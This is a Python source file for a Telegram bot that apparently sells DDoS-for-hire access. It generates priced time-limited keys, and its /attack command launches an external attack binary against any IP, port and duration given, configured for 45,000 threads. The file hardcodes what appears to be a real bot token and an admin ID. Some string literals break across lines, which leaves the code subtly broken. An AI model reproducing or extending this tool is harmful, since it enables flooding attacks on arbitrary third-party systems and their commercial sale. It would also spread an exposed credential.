
import time
import logging
import json
from threading import Thread
import telebot
import asyncio
import random
import string
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from typing import Dict, List, Optional
import subprocess
import sys
import os

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

# Updated Bot Configuration
KEY_PRICES = {
    'hour': 10,
    'day': 80,
    'week': 500
}
ADMIN_IDS = [6773132033]  # Add admin IDs here
BOT_TOKEN = "7971488271:AAE5o0zQj2NBpwcWBQjIKSCiWT63jbRy4f8"  # Add your bot token here
THREAD_COUNT = 45000  # Enhanced thread count for performance
PACKET_SIZE = 450  # Enhanced packet size for larger payloads
COOLDOWN_MINUTES = 0

# File paths
ADMIN_FILE = 'admin_data.json'
USERS_FILE = 'users.txt'
KEYS_FILE = 'keys.txt'
BINARY_PATH = './attack_binary'  # Path to the optimized binary

# Helper Functions
def check_cooldown(user_id: int) -> tuple[bool, int]:
    """Check if a user is in cooldown."""
    current_time = datetime.now()
    if user_id in last_attack_times:
        elapsed = current_time - last_attack_times[user_id]
        if elapsed.total_seconds() < COOLDOWN_MINUTES * 60:
            remaining = COOLDOWN_MINUTES * 60 - elapsed.total_seconds()
            return True, int(remaining)
    return False, 0


def update_last_attack_time(user_id: int):
    """Update the last attack time for a user."""
    last_attack_times[user_id] = datetime.now()


def load_json_file(filepath, default):
    """Load JSON data from a file."""
    if not os.path.exists(filepath):
        with open(filepath, 'w') as f:
            json.dump(default, f)
    try:
        with open(filepath, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Error loading {filepath}: {e}")
        return default


def save_json_file(filepath, data):
    """Save JSON data to a file."""
    try:
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving {filepath}: {e}")


def generate_key(length=15):
    """Generate a random alphanumeric key."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def calculate_key_price(amount: int, time_unit: str) -> float:
    """Calculate the price for a key based on duration."""
    return KEY_PRICES.get(time_unit, 0) * amount

# Load Data
last_attack_times = {}
admin_data = load_json_file(ADMIN_FILE, {'admins': {}})
users = load_json_file(USERS_FILE, [])
keys = load_json_file(KEYS_FILE, {})

# Initialize Bot
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Send a welcome message and user options."""
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"

    # Check if user is an admin
    if user_id in ADMIN_IDS:
        bot.send_message(
            message.chat.id,
            f"Welcome, Admin {username}!
Available commands:
"
            "/addadmin, /genkey, /attack, /checkbalance"
        )
    else:
        bot.send_message(
            message.chat.id,
            f"Welcome, {username}!
Please redeem a key to access premium features."
        )

@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    """Generate a key based on user input."""
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "You do not have permission to generate keys.")
        return

    try:
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "Usage: /genkey <amount> <unit (hour/day/week)>")
            return

        amount = int(args[1])
        unit = args[2]
        price = calculate_key_price(amount, unit)

        key = generate_key()
        keys[key] = {'duration': f"{amount} {unit}", 'price': price}
        save_json_file(KEYS_FILE, keys)

        bot.reply_to(
            message,
            f"Key generated:
Key: {key}
Duration: {amount} {unit}
Price: {price}"
        )
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    """Start a real attack based on provided input."""
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "You do not have permission to start an attack.")
        return

    try:
        args = message.text.split()
        if len(args) != 4:
            bot.reply_to(message, "Usage: /attack <IP> <port> <duration>")
            return

        target_ip = args[1]
        target_port = int(args[2])
        duration = int(args[3])

        update_last_attack_time(user_id)
        bot.reply_to(message, f"Initiating attack on {target_ip}:{target_port} for {duration} seconds.")

        # Execute the binary with the provided parameters
        command = [BINARY_PATH, target_ip, str(target_port), str(duration)]
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        if process.returncode == 0:
            bot.reply_to(message, f"Attack on {target_ip}:{target_port} completed successfully.
{stdout.decode()}")
        else:
            bot.reply_to(message, f"Attack failed with error:
{stderr.decode()}")

    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

if __name__ == '__main__':
    logger.info("Bot is running...")
    bot.polling()
